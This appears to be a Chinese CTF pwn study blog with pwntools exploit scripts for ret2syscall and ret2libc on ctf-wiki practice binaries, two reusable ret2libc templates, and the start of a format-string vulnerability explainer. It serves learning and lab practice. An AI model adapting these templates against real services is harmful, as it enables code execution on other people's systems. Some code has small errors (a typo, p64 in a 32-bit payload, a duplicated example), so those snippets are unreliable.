<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = </span><br><span class="line">rax_rdx_rbx_addr =</span><br><span class="line">rdi_addr =</span><br><span class="line">rsi_addr =</span><br><span class="line">binsh_addr =</span><br><span class="line">syscall_addr =</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*offest+p64(rdi_addr)+p64(binsh_addr)+p64(rax_rdx_rbx_addr)+p64(<span class="number">0x3b</span>)+p64(<span class="number">0x0</span>)+p64(<span class="number">0X0</span>)+p64(rsi_addr)+p64(<span class="number">0x0</span>)+p64(syscall_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<h2 id="VKYue"><font style="color:rgba(0, 0, 0, 0.87);">ret2libc</font></h2>
<font style="color:rgba(0, 0, 0, 0.87);">libc是Linux下的ANSI C的函数库，ANSI C是基本的C语言函数库，包含了C语言最基本的库函数。ret2libc类比之前介绍的三种方法，从字面意思看就是控制返回地址找libc中库函数存在的方法。</font>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">一般情况下，我们使用ret2libc主要针对动态链接编译的程序，程序动态链接了libc.so等动态链接库，虽然程序本身并没有用到system等危险函数，但是动态链接库中存在大量的可利用函数，就产生了新的攻击方式，从这些动态链接库中找可利用片段，拼接成恶意代码并控制rip跳转执行。</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<h3 id="nySln"><font style="color:rgba(0, 0, 0, 0.87);">ret2libc1</font></h3>
system 和 /bin/sh 都存在。



<p><font style="color:rgba(0, 0, 0, 0.87);">以ctf-wiki中的题为例：</font><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1">ret2libc1</a></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">首先，我们检查一下程序的安全保护：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/kali/Desktop/pwn&#x27;</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">32位小端序，开启了NX保护</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">IDA打开</font></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;RET2LIBC &gt;_&lt;&quot;</span>);</span><br><span class="line">    gets(s);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">可以看到在执行 gets 函数的时候出现了栈溢出，偏移量为：0x64+4+4+4。</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">然后寻找 system 函数和字符串 &#x2F;bin&#x2F;sh</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">&#x2F;bin&#x2F;sh：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.rodata:08048720 2F 62 69 6E 2F 73 68 00       aBinSh db &#x27;/bin/sh&#x27;,0                   ; DATA XREF: .data:shell↓o</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">system：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOAD:08048303 73 79 73 74 65 6D 00          aSystem db &#x27;system&#x27;,0                   ; DATA XREF: LOAD:08048218↑o</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">那么，我们直接返回该处，即执行 system 函数。</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">EXP：</font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x64</span>+<span class="number">4</span>+<span class="number">4</span>+<span class="number">4</span></span><br><span class="line">binsh_addr = <span class="number">0x8048720</span></span><br><span class="line">system_plt = <span class="number">0x08048460</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*offset + p32(system_plt) + p32(<span class="number">0x0</span>) + p64(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><font style="color:rgb(0, 0, 0);">32位的分布是这样子的，返回地址+下一次的返回地址+参数1+参数2+…</font></p>
<p><font style="color:rgb(0, 0, 0);">我们下一次返回地址是啥都行，因为我们拿到shell就跑了，可以直接为0，也可以是真实的地址（最好是）</font></p>
<p><font style="color:rgb(0, 0, 0);"></font></p>
<h3 id="bdt8n"><font style="color:rgba(0, 0, 0, 0.87);">ret2libc2</font></h3>
没有 /bin/sh 。



<p><font style="color:rgba(0, 0, 0, 0.87);">以ctf-wiki中的题为例：</font><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2">ret2libc2</a></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">首先，我们检查一下程序的安全保护：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/kali/Desktop/pwn&#x27;</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">32位小端序，开启了NX保护</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">IDA打开</font></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Something surprise here, but I don&#x27;t think it will work.&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;What do you think ?&quot;</span>);</span><br><span class="line">    gets(s);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">执行 gets 函数的时候出现了栈溢出，偏移量为：0x64+4+4+4。</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">system：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOAD:0804831A 73 79 73 74 65 6D 00          aSystem db &#x27;system&#x27;,0                   ; DATA XREF: LOAD:08048228↑o</span><br></pre></td></tr></table></figure>

<p>没有找到 &#x2F;bin&#x2F;sh </p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p>尽管没有 &#x2F;bin&#x2F;sh ，但程序中调用了 gets 函数，如此，字符串 bin&#x2F;sh 可以通过 gets 函数输入。</p>
<p><font style="color:rgba(0, 0, 0, 0.87);">那么，接下来需要解决的问题就是，字符串 &#x2F;bin&#x2F;sh 通过 gets 函数输入到哪里进行存储？</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">不能在溢出点 s 存储，因为在溢出位置输入字符串，然后再劫持回来执行system函数，会覆盖数据。</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">这里向程序中 bss 段的 buf2 处写入 &#x2F;bin&#x2F;sh 字符串</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0804A080                               public buf2</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">查看 bss 段的 buf2 是否可读、可写、可执行</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 依次输入</span><br><span class="line">gdb ret2libc2</span><br><span class="line">start</span><br><span class="line">vmmap</span><br></pre></td></tr></table></figure>

<p>找到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0804a000 0x0804b000 rw-p      /home/kali/Desktop/pwn</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">确实可读、可写、可执行。</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">EXP：</font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x64</span>+<span class="number">4</span>+<span class="number">4</span>+<span class="number">4</span></span><br><span class="line">sys_addr=<span class="number">0x8048490</span></span><br><span class="line">gets_addr=<span class="number">0x8048460</span></span><br><span class="line">bss_addr=<span class="number">0x804A080</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*offset +p32(gets_addr)+p32(sys_addr)+p32(bss_addr)+p32(bss_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)    <span class="comment"># 先发送构造好的 payload，触发缓冲区溢出，覆盖返回地址，实现函数链调用。</span></span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)  <span class="comment"># 再发送字符串 /bin/sh，此字符串通过 gets() 写入到 bss 段（bss_addr），最终作为 system() 的参数调用，打开 shell。</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<ul>
<li><font style="color:rgba(0, 0, 0, 0.87);">b’a’*112：填充 112 个字符以覆盖缓冲区（及覆盖掉函数调用时保存的 EBP），为覆盖返回地址做准备。</font></li>
<li><font style="color:rgba(0, 0, 0, 0.87);">p32(gets_addr)：覆盖返回地址，使得函数返回时跳转到 gets() 函数。（后面的发送 ‘&#x2F;bin&#x2F;sh’ 就会使用这个 gets 函数）</font></li>
<li><font style="color:rgba(0, 0, 0, 0.87);">p32(sys_addr)：gets() 执行完毕后返回时，跳转到 system() 函数。</font></li>
<li><font style="color:rgba(0, 0, 0, 0.87);">p32(bss_addr)：（第一次）：作为 gets() 的参数，即 gets() 会把输入写入这个地址。（也就是 &#x2F;bin&#x2F;sh ）</font></li>
<li><font style="color:rgba(0, 0, 0, 0.87);">p32(bss_addr)：（第二次）：作为 system() 的参数，即 system(bss_addr) 将执行存储在 bss_addr 处的 “&#x2F;bin&#x2F;sh”。</font></li>
</ul>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<h3 id="tdUNO"><font style="color:rgba(0, 0, 0, 0.87);">ret2libc3</font></h3>
<font style="color:rgba(0, 0, 0, 0.87);">system 和 /bin/sh 都不存在。</font>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">以ctf-wiki中的题为例：</font><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3">ret2libc3</a></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">首先，我们检查一下程序的安全保护：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/kali/Desktop/pwn&#x27;</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">32位小端序，开启了NX保护</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">IDA打开</font></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No surprise anymore, system disappeard QQ.&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Can you find it !?&quot;</span>);</span><br><span class="line">    gets(s);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">依旧是执行 gets 函数的时候出现了栈溢出，偏移量为：0x64+4+4+4。</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p>检查后发现没有 system 函数和字符串 &#x2F;bin&#x2F;sh 。这时我们需要在函数动态绑定的 libc 中找，例如经常使用的</p>
<p><font style="color:rgba(0, 0, 0, 0.87);">system、&#x2F;bin&#x2F;sh字符串。</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p>找 libc.so 版本：</p>
<ul>
<li><font style="color:rgba(0, 0, 0, 0.87);"></font><a href="https://libc.blukat.me/">https://libc.blukat.me/</a></li>
<li><a href="https://github.com/lieanu/LibcSearcher">LibcSearcher</a></li>
</ul>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p>总的来说：</p>
<p><font style="color:rgba(0, 0, 0, 0.87);">1、通过第一次溢出，通过将 puts 的 PLT 地址放到返回处，泄漏出执行过的函数的 GOT 地址（实际上 puts 的就可以）</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">2、将 puts 的返回地址设置为 _start 函数（main () 函数是用户代码的入口，是对用户而言的；而_start () 函数是系统代码的入口，是程序真正的入口），方便再次用来执行 system(‘&#x2F;bin&#x2F;sh’)</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">3、通过泄露的函数的 GOT 地址计算出 libc 中的 system 和 &#x2F;bin&#x2F;sh 的地址</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">4、再次通过溢出将返回地址覆盖成泄露出来的 system 的地址 getshell</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">EXP：</font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;pwn&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">112</span> + p32(puts_plt) + p32(start_addr) + p32(puts_got)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;!?&quot;</span>,payload1)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">112</span> + p32(system_addr) + p32(<span class="number">1234</span>) + p32(binsh_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;!?&quot;</span>,payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<h3 id="gnqOP"><font style="color:rgba(0, 0, 0, 0.87);">模板</font></h3>
write_32

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote()</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc____&quot;</span>)      <span class="comment"># 题目提供的 lic 文件</span></span><br><span class="line">e = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">write_plt_addr = e.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">write_got_addr = e.got[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">main_addr = e.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"></span><br><span class="line">offset = ???</span><br><span class="line">payload = offset*<span class="string">b&#x27;a&#x27;</span> + p32(write_plt_addr) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got_addr) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">write_offset = libc.symbols[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_offset = libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">base_addr = write_addr - write_offset</span><br><span class="line">system_addr = base_addr + system_offset</span><br><span class="line">binsh_addr = base_addr + binsh_offset</span><br><span class="line"></span><br><span class="line">payload = offset*<span class="string">b&#x27;a&#x27;</span> + p32(system_addr) + p32(<span class="number">1</span>) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#r.recvuntil()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p>puts_32</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote()</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start_addr = e.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"></span><br><span class="line">offset = ???</span><br><span class="line">payload1 = offset*<span class="string">b&#x27;a&#x27;</span> + p32(puts_plt) + p32(start_addr) + p32(puts_got)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil()</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment">#p.recvline() x ???       （有时候需要接收信息才能打印地址，具体需要接收多少次自己试）</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = offset*<span class="string">b&#x27;a&#x27;</span> + p32(system_addr) + p32(<span class="number">1234</span>) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#r.recvuntil()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="rznxT">总结</h2>
ret2text：NX保护任意，程序内部有可用代码（如后门函数）

<p>ret2shellcode：NX保护关闭（一般是），可执行内存 + Shellcode写入</p>
<p>ret2syscall：NX保护开启，ROP Gadget + 系统调用参数</p>
<p>ret2libc：NX保护开启，Libc泄露 + system + &#x2F;bin&#x2F;sh</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>格式化字符串漏洞</title>
    <url>/2025/03/29/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>记录</p>
<span id="more"></span>
<p>格式化字符串漏洞指的是printf仅包含格式化字符串，而没有其他参数时，会越界访问到栈中高地址的内容作为参数，可以造成内存数据被泄露或修改。</p>
<h2 id="avPnq">前提</h2>
在C语言中，格式化字符串主要用于printf()、scanf()、sprintf()等函数，用于控制输入/输出的格式。格式化字符串包含普通字符和格式说明符（以%开头的特殊序列）。



<p>printf() 函数的调用格式为:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;&lt;格式化字符串&gt;&quot;</span>, &lt;参量表&gt;);</span><br></pre></td></tr></table></figure>



<p>printf的第1个参数是字符串，被称为<strong>格式化字符串</strong>。程序员可以在该字符串中使用%d、%s、%c等占位符，printf将依据这些占位符和其他参数整合出一个完整的字符串并输出。</p>
<p>如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The value of a is %d\n&quot;</span>, a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The value of a is 10</span><br></pre></td></tr></table></figure>



<p>那如果修改一下，去掉第2个参数，即去掉参量表</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The value of a is %d\n&quot;</span>, a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The value of a is 10228640</span><br></pre></td></tr></table></figure>



<p>为什么输出 10228640？</p>
<p>printf 通过格式化字符串中的 %d、%s 等占位符，<strong>从栈上读取参数</strong>。</p>
<p>当调用 printf(“…%d…”) 但未传递对应的变量时，printf 仍然会尝试从栈上读取一个值，并把它当作整数解释。</p>
<h2 id="VPRDL">漏洞原理</h2>
先看第一段代码中的 printf 是如何实现访问实参的

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|-------------------|</span><br><span class="line">| arg2 (10)         | ← 如果传入 `a`，这里应该是 `a` 的值（10）</span><br><span class="line">|-------------------|</span><br><span class="line">| arg1 (格式化字符串地址) | ← 指向 &quot;The value of a is %d\n&quot;</span><br><span class="line">|-------------------|</span><br><span class="line">| 返回地址           |</span><br><span class="line">|-------------------|</span><br><span class="line">| 调用者的 ebp       |</span><br><span class="line">|-------------------|</span><br><span class="line">| 局部变量等...      |</span><br><span class="line">|-------------------|</span><br><span class="line">| esp               |</span><br><span class="line">|-------------------|</span><br></pre></td></tr></table></figure>

<p>printf的默认首地址是栈上 第一个参数（arg1），即格式化字符串的地址。</p>
<p><font style="color:rgb(25, 27, 31);">再来看第二段代码</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|-------------------|</span><br><span class="line">| same data         | </span><br><span class="line">|-------------------|</span><br><span class="line">| arg1 (格式化字符串地址) | ← 指向 &quot;The value of a is %d\n&quot;</span><br><span class="line">|-------------------|</span><br><span class="line">| 返回地址           |</span><br><span class="line">|-------------------|</span><br><span class="line">| 调用者的 ebp       |</span><br><span class="line">|-------------------|</span><br><span class="line">| 局部变量等...      |</span><br><span class="line">|-------------------|</span><br><span class="line">| esp               |</span><br><span class="line">|-------------------|</span><br></pre></td></tr></table></figure>

<p>此时父函数只把第1个参数压入了栈中，参数上方是其他的数据，但是 printf 并不知情，把栈上的其他数据认成了第2个参数，并且输出了出来。</p>
<h2 id="gHRtB">漏洞利用</h2>
<h3 id="lvsKF">获取栈上数据</h3>
printf 的参数是通过栈传递的（32位系统），或部分通过寄存器传递（64位系统）。

<p>格式化字符串中的每一个 %d、%x、%s 都会依次从栈上读取数据：</p>
<ul>
<li>%1$d 读取第1个参数</li>
<li>%2$d 读取第2个参数</li>
<li>…</li>
<li>%100$d 读取第100个参数</li>
</ul>
<h3 id="37284b1b"><font style="color:rgb(25, 27, 31);">获取任意地址的数据</font></h3>
我们先来看printf("%s", str)是如何工作的

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|-------------------| 高地址</span><br><span class="line">| str (字符串地址)   | ← 第2个参数（`str` 的指针）</span><br><span class="line">|-------------------|</span><br><span class="line">| &quot;%s&quot; (格式化字符串地址) | ← 第1个参数</span><br><span class="line">|-------------------|</span><br><span class="line">| 返回地址           | ← `call printf` 时压入</span><br><span class="line">|-------------------|</span><br><span class="line">| 调用者的ebp        | ← `push ebp` 保存</span><br><span class="line">|-------------------|</span><br><span class="line">| 局部变量等...      | ← 当前函数的栈帧</span><br><span class="line">|-------------------| 低地址 (esp)</span><br></pre></td></tr></table></figure>

<p>printf(“%s”, str) 会尝试将 str 当作字符串指针，并打印该地址指向的内存，直到遇到 \0。</p>
